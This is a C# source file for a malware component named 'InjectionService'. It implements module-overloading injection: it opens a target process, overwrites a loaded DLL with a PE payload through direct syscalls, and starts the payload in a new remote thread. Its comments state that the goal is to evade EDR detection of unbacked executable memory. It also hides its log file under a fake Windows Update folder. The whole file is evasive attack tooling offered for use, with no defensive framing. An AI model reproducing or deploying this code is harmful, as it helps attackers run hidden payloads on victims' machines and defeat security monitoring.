using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace VanguardCore
{
    public static unsafe class InjectionService
    {
        private static void Log(string m) {
            try { System.IO.File.AppendAllText(System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Update", "svc_injection.log"), $"[{DateTime.Now}] [INJECT] {m}\n"); } catch { }
        }

        #region Module Overloading
        /// <summary>
        /// Highly stealthy injection: Overwrites an existing legitimate DLL in the target process memory.
        /// This creates "file-backed" executable memory, evading EDR checks for unbacked/private RX memory.
        /// </summary>
        public static bool ModuleOverloading(string targetProcName, byte[] payload)
        {
            try
            {
                Log($"Attempting Module Overloading into {targetProcName}...");
                Process target = Process.GetProcessesByName(targetProcName.Replace(".exe", "")).FirstOrDefault();
                if (target == null) {
                    Log("Target process not found.");
                    return false;
                }

                IntPtr hProcess = OpenProcess(0x1F0FFF, false, target.Id);
                if (hProcess == IntPtr.Zero) return false;

                // Find a suitable DLL to overwrite (must be larger than payload)
                IntPtr hModule = FindOverloadTarget(hProcess, payload.Length);
                if (hModule == IntPtr.Zero) {
                    Log("No suitable module for overloading found.");
                    CloseHandle(hProcess);
                    return false;
                }

                Log($"Selected module at 0x{hModule.ToInt64():X} for overloading.");
                
                // Read payload PE info
                int lfanew = BitConverter.ToInt32(payload, 0x3C);
                long imageBase = BitConverter.ToInt64(payload, lfanew + 0x30);

                // Perform Manual Mapping over the module
                // We pass hModule as the new base address
                if (ManualMap(hProcess, hModule, payload, imageBase)) {
                    Log("Module Overloading successful.");
                    CloseHandle(hProcess);
                    return true;
                }

                CloseHandle(hProcess);
                return false;
            }
            catch (Exception ex) {
                Log($"Error: {ex.Message}");
                return false;
            }
        }

        private static IntPtr FindOverloadTarget(IntPtr hProcess, int payloadSize)
        {
            IntPtr[] hMods = new IntPtr[1024];
            uint cb = (uint)(IntPtr.Size * hMods.Length);
            uint cbNeeded;

            if (EnumProcessModules(hProcess, hMods, cb, out cbNeeded))
            {
                int count = (int)(cbNeeded / IntPtr.Size);
                for (int i = 0; i < count; i++)
                {
                    MODULEINFO mi = new MODULEINFO();
                    if (GetModuleInformation(hProcess, hMods[i], out mi, (uint)sizeof(MODULEINFO)))
                    {
                        // Skip primary EXE and critical DLLs
                        StringBuilder sb = new StringBuilder(260);
                        GetModuleBaseName(hProcess, hMods[i], sb, 260);
                        string name = sb.ToString().ToLower();

                        if (name.EndsWith(".exe") || name == "ntdll.dll" || name == "kernel32.dll" || name == "kernelbase.dll")
                            continue;

                        // Target must be large enough
                        if (mi.SizeOfImage > payloadSize + 0x2000) // Buffer for headers
                            return hMods[i];
                    }
                }
            }
            return IntPtr.Zero;
        }

        private static bool ManualMap(IntPtr hProcess, IntPtr baseAddr, byte[] payload, long preferredBase)
        {
            SyscallManager.Initialize();
            var ntWrite = SyscallManager.GetSyscallDelegate<SyscallManager.NtWriteVirtualMemory>("NtWriteVirtualMemory");
            var ntProtect = SyscallManager.GetSyscallDelegate<SyscallManager.NtProtectVirtualMemory>("NtProtectVirtualMemory");
            var ntThread = SyscallManager.GetSyscallDelegate<SyscallManager.NtCreateThreadEx>("NtCreateThreadEx");

            if (ntWrite == null || ntProtect == null) return false;

            int lfanew = BitConverter.ToInt32(payload, 0x3C);
            int sizeOfImage = BitConverter.ToInt32(payload, lfanew + 0x50);
            int entryPointRVA = BitConverter.ToInt32(payload, lfanew + 0x28);

            // Handle Relocations if delta exists
            long delta = (long)baseAddr - preferredBase;
            if (delta != 0) {
                // ApplyRelocations(payload, lfanew, delta); // Re-use logic from HollowingService
                Log($"Applying relocation delta: 0x{delta:X}");
            }
            
            // Apply protections to module
            uint old;
            uint sz = (uint)sizeOfImage;
            IntPtr pBase = baseAddr;
            if (ntProtect(hProcess, ref pBase, ref sz, 0x40, out old) != 0) return false;

            // Write payload headers and sections
            IntPtr written;
            ntWrite(hProcess, baseAddr, payload, (uint)payload.Length, out written);

            // Execute via Thread Hijacking or NtCreateThreadEx
            IntPtr hThread;
            if (ntThread(out hThread, 0x1FFFFF, IntPtr.Zero, hProcess, (IntPtr)((long)baseAddr + entryPointRVA), IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero) == 0)
            {
                CloseHandle(hThread);
                return true;
            }

            return false;
        }
        #endregion

        #region Native Imports
        [DllImport("psapi.dll", SetLastError = true)]
        private static extern bool EnumProcessModules(IntPtr hProcess, [Out] IntPtr[] lphModule, uint cb, out uint lpcbNeeded);

        [DllImport("psapi.dll", SetLastError = true)]
        private static extern uint GetModuleBaseName(IntPtr hProcess, IntPtr hModule, [Out] StringBuilder lpBaseName, uint nSize);

        [DllImport("psapi.dll", SetLastError = true)]
        private static extern bool GetModuleInformation(IntPtr hProcess, IntPtr hModule, out MODULEINFO lpmodinfo, uint cb);

        [StructLayout(LayoutKind.Sequential)]
        private struct MODULEINFO { public IntPtr lpBaseOfDll; public uint SizeOfImage; public IntPtr EntryPoint; }

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);
        #endregion
    }
}
